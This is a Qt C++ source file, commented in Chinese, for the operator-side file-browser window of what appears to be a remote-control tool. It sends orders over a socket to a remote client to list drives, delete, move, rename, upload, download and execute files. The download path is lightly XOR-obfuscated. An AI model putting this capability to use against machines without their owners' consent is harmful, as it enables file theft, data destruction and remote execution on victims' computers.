#include "myfilewindows.h"
#include "nofocusdelegate.cpp"
#include <QHeaderView>
#include <QScrollBar>
#include <QApplication>
#include <QDesktopWidget>
#include <QTableWidgetItem>
#include <QtWin>
#include <QInputDialog>
#include <QFileDialog>

#include "tool.h"


myfileWindows::myfileWindows(QWidget *parent,netManager* nm) : QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose, true);
    current_path="/";
    copyFilename="";
    copyFilepath="";
    this->nm=nm;
    h = new QHBoxLayout();
    v = new QVBoxLayout();
    t_path = new QLineEdit(this);
    b_back = new QPushButton(this);
    b_forward= new QPushButton(this);
    b_refresh= new QPushButton(this);
    b_upload= new QPushButton(this);
    b_download = new QPushButton(this);
    b_cut = new QPushButton(this);
    b_paste = new QPushButton(this);
    b_copy = new QPushButton(this);
    b_delete = new QPushButton(this);
    list = new QTableWidget(this);




    b_back->setIcon(QIcon(":/image/image/file_back.png"));
    b_back->setFlat(true);
    b_back->setToolTip("后退");
    b_forward->setIcon(QIcon(":/image/image/file_forward.png"));
    b_forward->setFlat(true);
    b_forward->setToolTip("前进");
    b_refresh->setIcon(QIcon(":/image/image/file_refresh.png"));
    b_refresh->setFlat(true);
    b_refresh->setToolTip("刷新");
    b_upload->setIcon(QIcon(":/image/image/file_upload.png"));
    b_upload->setFlat(true);
    b_upload->setToolTip("上传");
    b_download->setIcon(QIcon(":/image/image/file_download.png"));
    b_download->setFlat(true);
    b_download->setToolTip("下载");
    b_copy->setIcon(QIcon(":/image/image/file_copy.png"));
    b_copy->setFlat(true);
    b_copy->setToolTip("复制");

    b_cut->setIcon(QIcon(":/image/image/file_cut.png"));
    b_cut->setFlat(true);
    b_cut->setToolTip("剪切");

    b_paste->setIcon(QIcon(":/image/image/file_paste.png"));
    b_paste->setFlat(true);
    b_paste->setToolTip("粘贴");

    b_delete->setIcon(QIcon(":/image/image/file_delete.png"));
    b_delete->setFlat(true);
    b_delete->setToolTip("删除");

    right_menu=new QMenu(this);

    a_delete=new QAction("删除",this);
    a_download=new QAction("下载",this);
    a_copy=new QAction("复制",this);
    a_cut=new QAction("剪切",this);
    a_rename=new QAction("重命名",this);
    a_run=new QAction("运行",this);
    a_paste=new QAction("粘贴",this);

    a_delete->setIcon(QIcon(":/image/image/file_delete.png"));
    a_download->setIcon(QIcon(":/image/image/file_download.png"));
    a_copy->setIcon(QIcon(":/image/image/file_copy.png"));
    a_cut->setIcon(QIcon(":/image/image/file_cut.png"));
    a_rename->setIcon(QIcon(":/image/image/file_rename.png"));
    a_run->setIcon(QIcon(":/image/image/file_run.png"));
    a_paste->setIcon(QIcon(":/image/image/file_paste.png"));

    right_menu->addAction(a_delete);
    right_menu->addAction(a_download);
    right_menu->addAction(a_copy);
    right_menu->addAction(a_cut);
    right_menu->addAction(a_paste);
    right_menu->addAction(a_rename);
    right_menu->addAction(a_run);


    h->addWidget(b_back,1);
    h->addWidget(b_forward,1);
    h->addWidget(b_refresh,1);
    h->addWidget(b_upload,1);
    h->addWidget(b_download,1);
    h->addWidget(b_copy,1);
    h->addWidget(b_cut,1);
    h->addWidget(b_paste,1);
    h->addWidget(b_delete,1);
    h->addWidget(t_path,20);



    list->setColumnCount(6);//设置列数

    QStringList header;
    header<<"名字"<<"大小"<<"修改时间"<<"访问时间"<<"创建时间"<<"权限";
    list->setHorizontalHeaderLabels(header);//设置表头
    list->setColumnWidth(0,200);
    list->setColumnWidth(1,80); //调整表格的列宽
    list->setColumnWidth(2,150);
    list->setColumnWidth(3,150);
    list->setColumnWidth(4,150);
    list->setColumnWidth(5,200);
    list->setSortingEnabled(true);//可排序
    list->verticalHeader()->setVisible(false);//垂直表头不可见
    list->setShowGrid(false); //设置不显示格子线
    list->setFrameShape(QFrame::NoFrame); //设置无边框
    list->verticalHeader()->setDefaultSectionSize(20); //设置行高
    list->setSelectionBehavior(QAbstractItemView::SelectRows);  //每次选择一行
    list->setEditTriggers(QAbstractItemView::NoEditTriggers); //设置不可编辑
    list->setStyleSheet("selection-background-color:lightblue;"); //设置选中背景色
    list->setSelectionMode(QAbstractItemView::SingleSelection);//单选
    list->setItemDelegate(new NoFocusDelegate());//用于取消选中时产生的虚线
    list->horizontalHeader()->setHighlightSections(false);//取消表头塌陷
    QFont font = list->horizontalHeader()->font();
    font.setBold(true);
    list->horizontalHeader()->setFont(font);//表头字体加粗
    list->horizontalScrollBar()->setStyleSheet("QScrollBar{background:transparent; height:10px;}"
                                               "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                               "QScrollBar::handle:hover{background:gray;}"
                                               "QScrollBar::sub-line{background:transparent;}"
                                               "QScrollBar::add-line{background:transparent;}");

    list->verticalScrollBar()->setStyleSheet("QScrollBar{background:transparent; width: 10px;}"
                                             "QScrollBar::handle{background:lightgray; border:2px solid transparent; border-radius:5px;}"
                                             "QScrollBar::handle:hover{background:gray;}"
                                             "QScrollBar::sub-line{background:transparent;}"
                                             "QScrollBar::add-line{background:transparent;}");

    list->setHorizontalScrollMode(QAbstractItemView::ScrollPerPixel);//滚动条按像素移动
    list->setVerticalScrollMode(QAbstractItemView::ScrollPerPixel);

    list->setContextMenuPolicy(Qt::CustomContextMenu);//自定义右键菜单


    v->addLayout(h,1);
    v->addWidget(list,10);

    this->setLayout(v);

    const int w = 600, hh = 450;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - hh) >> 1;
    this->setGeometry(x, y, w, hh);
    //设置显示的位置和大小
//    setFixedSize(this->width(), this->height());
    //设置不可调节大小
    this->setWindowTitle("file "+tool::GetAddressBySocket(nm->sClient));
    this->setWindowIcon(QIcon(":/image/image/file.png"));
    this->setWindowFlags(this->windowFlags());
    //隐藏最大最小按钮

    t_path->installEventFilter(this);

    connect(list, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(showMenu(QPoint)));//右键菜单
    connect(list, SIGNAL(cellDoubleClicked(int,int)),this, SLOT(openDir(int,int)));//双击进入子文件夹
    connect(b_refresh, SIGNAL(clicked(bool)), this, SLOT(refresh()));       //刷新
    connect(b_back, SIGNAL(clicked(bool)), this, SLOT(back()));             //后退
    connect(b_forward, SIGNAL(clicked(bool)), this, SLOT(forward()));       //前进
    connect(b_upload, SIGNAL(clicked(bool)), this, SLOT(upload()));         //上传
    connect(b_download, SIGNAL(clicked(bool)), this, SLOT(download()));     //下载
    connect(a_download, SIGNAL(triggered(bool)), this, SLOT(download()));     //下载
    connect(b_cut, SIGNAL(clicked(bool)), this, SLOT(cut()));               //剪切
    connect(a_cut, SIGNAL(triggered(bool)), this, SLOT(cut()));               //剪切
    connect(a_paste, SIGNAL(triggered(bool)), this, SLOT(paste()));
    connect(b_paste, SIGNAL(clicked(bool)), this, SLOT(paste()));           //粘贴
    connect(b_copy, SIGNAL(clicked(bool)), this, SLOT(copy()));             //复制
    connect(a_copy, SIGNAL(triggered(bool)), this, SLOT(copy()));             //复制
    connect(b_delete, SIGNAL(clicked(bool)), this, SLOT(deletefile()));     //删除
    connect(a_delete, SIGNAL(triggered(bool)), this, SLOT(deletefile()));     //删除
    connect(a_rename, SIGNAL(triggered(bool)), this, SLOT(rename()));         //重命名
    connect(a_run, SIGNAL(triggered(bool)), this, SLOT(run()));               //运行


    connect(nm,SIGNAL(signalAddFilelist(mfile)),this,SLOT(addFile(mfile)));         //添加文件的槽

}

myfileWindows::~myfileWindows(){
//    disconnect(nm,SIGNAL(signalAddFilelist(mfile)),this,SLOT(addFile(mfile)));
    nm->filewindows=nullptr;
//    delete[] h;
//    delete[] v;
//    h=nullptr;
//    v=nullptr;


}

void myfileWindows::back(){
    if(stack_back.size()>0){
        stack_forward.push(current_path);
        current_path=stack_back.pop();
        refresh();
    }
}

void myfileWindows::forward(){
    if(stack_forward.size()>0){
        stack_back.push(current_path);
        current_path=stack_forward.pop();
        refresh();
    }
}

void myfileWindows::refresh(){
    t_path->setText(current_path);
    list->setRowCount(0);
    list->clearContents();

    std::string std_s = current_path.toStdString();
    unsigned long long l =std_s.length();

    morder tmporder;
    tmporder.orderType=30;
    tmporder.orderSize = l;
    tmporder.orderMem = new char[l];

    for(int i=0;i<l;i++){
        tmporder.orderMem[i]=std_s.at(i);
    }

   nm->orderQueue.push(tmporder);
   nm->addOrder();


}

void myfileWindows::upload(){
    if(current_path=='/')return;
     QString fileName = QFileDialog::getOpenFileName(this, "选择文件", " ",  "所有文件(*.*);");
//     QString fileName = "E:/mainwindow.cpp";

     if(fileName.length()<=1)return;
     std::string std_s=(fileName+"|"+current_path).toStdString();

     morder tmporder;
     tmporder.orderType=36;//上传文件给客户端
     tmporder.orderSize=std_s.length()+1;
     tmporder.orderMem=new char[tmporder.orderSize];
     for(int i=0;i<std_s.length();i++){
         tmporder.orderMem[i]=std_s.at(i);
     }
     tmporder.orderMem[std_s.length()]=0;
     nm->orderQueue.push(tmporder);
     nm->addOrder();

}

void myfileWindows::download(){
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }

    QString s = current_path + "/"+ list->item(row,0)->text();
    std::string std_s = s.toStdString();
    morder tmporder;
    tmporder.orderType=35;//从客户端下载文件到服务器
    tmporder.orderSize=std_s.length();
    tmporder.orderMem=new char[tmporder.orderSize];
    for(int i=0;i<s.toStdString().length();i++){
        tmporder.orderMem[i]=std_s.at(i)^std_s.length();
    }
    nm->orderQueue.push(tmporder);
    nm->addOrder();
}

void myfileWindows::cut(){
    if(current_path.compare("/")==0){
        return;
    }
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }
    copyOrCutFlag=false;
    copyFilename = list->item(row,0)->text();
    copyFilepath = current_path;
}

void myfileWindows::paste(){
    morder tmporder;
    if(copyOrCutFlag){
        tmporder.orderType=33;  //复制粘贴
    }else{
        tmporder.orderType=32;  //移动剪切
    }

    QString s =copyFilepath+"|"+ copyFilename+"|"+current_path+"|"+copyFilename;
    std::string std_s = s.toStdString();
    tmporder.orderSize=std_s.length()+1;
    tmporder.orderMem=new char[tmporder.orderSize];
    for(int i=0;i<std_s.length();i++){
        tmporder.orderMem[i]=std_s.at(i);
    }
    tmporder.orderMem[std_s.length()]=0;
    nm->orderQueue.push(tmporder);
    nm->addOrder();

}

void myfileWindows::copy(){
    if(current_path.compare("/")==0){
        return;
    }
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }
    copyOrCutFlag=true;
    copyFilename = list->item(row,0)->text();
    copyFilepath = current_path;

}

void myfileWindows::deletefile(){
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }

    QString s = current_path + "/"+ list->item(row,0)->text();
    std::string std_s = s.toStdString();
    morder tmporder;
    tmporder.orderType=31;//删除文件
    tmporder.orderSize=std_s.length()+1;
    tmporder.orderMem=new char[tmporder.orderSize];
    for(int i=0;i<s.toStdString().length();i++){
        tmporder.orderMem[i]=std_s.at(i);
    }
    tmporder.orderMem[std_s.length()]=0;
    nm->orderQueue.push(tmporder);
    nm->addOrder();
    list->removeRow(row);

}

void myfileWindows::run(){
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }

    QString s = current_path + "/"+ list->item(row,0)->text();
    std::string std_s = s.toStdString();
    morder tmporder;
    tmporder.orderType=37;      //运行该程序
    tmporder.orderSize = std_s.length()+1;
    tmporder.orderMem = new char[tmporder.orderSize];
    for(int i=0;i<s.toStdString().length();i++){
        tmporder.orderMem[i]=std_s.at(i);
    }
    tmporder.orderMem[std_s.length()]=0;
    nm->orderQueue.push(tmporder);
    nm->addOrder();

}

void myfileWindows::rename(){
    bool ok;
    QTableWidgetItem* tmp = list->currentItem();
    int row =-1;
    if(tmp!=nullptr){
     row= tmp->row();
    }
    if(row==-1){
        return ;
    }
    QString oldname = list->item(row,0)->text();
    QString newname = QInputDialog::getText(this, "重命名",
                                         "新文件名", QLineEdit::Normal,
                                         oldname, &ok);
    if (ok && newname.length()>0){
        morder tmporder;
        QString s =current_path+"|"+ oldname+"|"+current_path+"|"+newname;
        std::string std_s = s.toStdString();
        tmporder.orderType=32;//重命名
        tmporder.orderSize=std_s.length()+1;
        tmporder.orderMem=new char[tmporder.orderSize];
        for(int i=0;i<std_s.length();i++){
            tmporder.orderMem[i]=std_s.at(i);
        }
        tmporder.orderMem[std_s.length()]=0;
        nm->orderQueue.push(tmporder);
        nm->addOrder();
        refresh();

    }


}

void myfileWindows::addFile(mfile tmpfile){

    int num = list->rowCount();
    list->insertRow(num);
    QIcon icon ;


    if(tmpfile.isRoot){

        switch(tmpfile.diskType){
            case 0:icon = QIcon(":/image/image/DRIVE_UNKNOWN.png");list->setItem(num,5,new QTableWidgetItem("未知设备"));break;
            case 1:icon = QIcon(":/image/image/DRIVE_NO_ROOT_DIR.png");list->setItem(num,5,new QTableWidgetItem("不存在该目录"));break;
            case 2:icon = QIcon(":/image/image/DRIVE_REMOVABLE.png");list->setItem(num,5,new QTableWidgetItem("U盘"));break;
            case 3:icon = QIcon(":/image/image/DRIVE_FIXED.png");list->setItem(num,5,new QTableWidgetItem("硬盘"));break;
            case 4:icon = QIcon(":/image/image/DRIVE_REMOTE.png");list->setItem(num,5,new QTableWidgetItem("网络磁盘"));break;
            case 5:icon = QIcon(":/image/image/DRIVE_CDROM.png");list->setItem(num,5,new QTableWidgetItem("光驱"));break;
            case 6:icon = QIcon(":/image/image/DRIVE_RAMDISK.png");list->setItem(num,5,new QTableWidgetItem("虚拟RAM"));break;
            default:icon = QIcon(":/image/image/DRIVE_UNKNOWN.png");list->setItem(num,5,new QTableWidgetItem("错误"));break;
        }

        list->setItem(num,0,new QTableWidgetItem(icon,tmpfile.fileName));
        list->setItem(num,1,new QTableWidgetItem(tool::ByteConvert(tmpfile.fileTotalSize)));
        list->setItem(num,2,new QTableWidgetItem(tool::ByteConvert(tmpfile.fileFreeSize)));

    }else{
        if(tmpfile.attrib&FILE_ATTRIBUTE_DIRECTORY){
            icon = QIcon(":/image/image/folder.png");
        }else{
            icon = getFileIcon(tool::getFileType(tmpfile.fileName));
            list->setItem(num,1,new QTableWidgetItem(tool::ByteConvert(tmpfile.size)));
        }

        list->setItem(num,0,new QTableWidgetItem(icon,tmpfile.fileName));

        list->setItem(num,2,new QTableWidgetItem(tool::timestampConvert(tmpfile.time_write)));
        list->setItem(num,3,new QTableWidgetItem(tool::timestampConvert(tmpfile.time_access)));
        list->setItem(num,4,new QTableWidgetItem(tool::timestampConvert(tmpfile.time_create)));
        list->setItem(num,5,new QTableWidgetItem(attribToString(tmpfile.attrib)));

    }
    list->viewport()->update();
}

void myfileWindows::openDir(int row,int col){
    stack_back.push(current_path);
    QString s = list->item(row,5)->text();
    if(s.contains("文件夹") || s.contains("硬盘") || s.contains("U盘")|| s.contains("网络磁盘")|| s.contains("光驱")|| s.contains("虚拟RAM")){
        QString p = list->item(row,0)->text();
        if(current_path.compare("/")==0){
            current_path=p;
        }else{
            if(current_path.at(current_path.length()-1)=="/"){
                current_path+=p;
            }else{
                current_path+="/"+p;
            }

        }


        stack_forward.clear();

        refresh();

    }

}

QIcon myfileWindows::getFileIcon(QString filetype){
    LPCSTR name = filetype.toStdString().c_str();
    QIcon file_icon;

    SHFILEINFOA info;
    if(SHGetFileInfoA(name,FILE_ATTRIBUTE_NORMAL,&info,sizeof(info),SHGFI_SYSICONINDEX | SHGFI_ICON | SHGFI_USEFILEATTRIBUTES))
    {
        HICON icon = info.hIcon;
        file_icon = QIcon(QtWin::fromHICON(icon));
    }
    return file_icon;
}

bool myfileWindows::eventFilter(QObject *target, QEvent *event){
    if(target == t_path) {
        if(event->type() == QEvent::KeyPress)
        {
            QKeyEvent *k = static_cast<QKeyEvent *>(event);
            if(k->key() == Qt::Key_Return)
            {
                if(t_path->text().length()<1){
                    return true;
                }
                stack_back.push(current_path);
                current_path=t_path->text();

                refresh();
                return true;
            }
        }
    }
    return QWidget::eventFilter(target,event);


}

QString myfileWindows::attribToString(unsigned attrib){
    QString s="";
    if(attrib & FILE_ATTRIBUTE_DIRECTORY){
        s+="文件夹 ";
    }
    if(attrib & FILE_ATTRIBUTE_HIDDEN){
        s+="隐藏 ";
    }
    if(attrib & FILE_ATTRIBUTE_READONLY){
        s+="只读 ";
    }
    if(attrib & FILE_ATTRIBUTE_ARCHIVE){
        s+="存档 ";
    }
    if(attrib & FILE_ATTRIBUTE_COMPRESSED){
        s+="压缩 ";
    }
    if(attrib & FILE_ATTRIBUTE_ENCRYPTED){
        s+="加密 ";
    }

    if(attrib & FILE_ATTRIBUTE_NORMAL){
        s+="一般 ";
    }
    if(attrib & FILE_ATTRIBUTE_NOT_CONTENT_INDEXED){
        s+="不索引 ";
    }

    if(attrib & FILE_ATTRIBUTE_TEMPORARY){
        s+="临时 ";
    }
    if(attrib & FILE_ATTRIBUTE_SYSTEM){
        s+="系统文件 ";
    }

    return s;

}

void myfileWindows::showMenu(const QPoint& pos){
    QPoint globalPos = list->mapToGlobal(pos);
    right_menu->exec(globalPos);
}
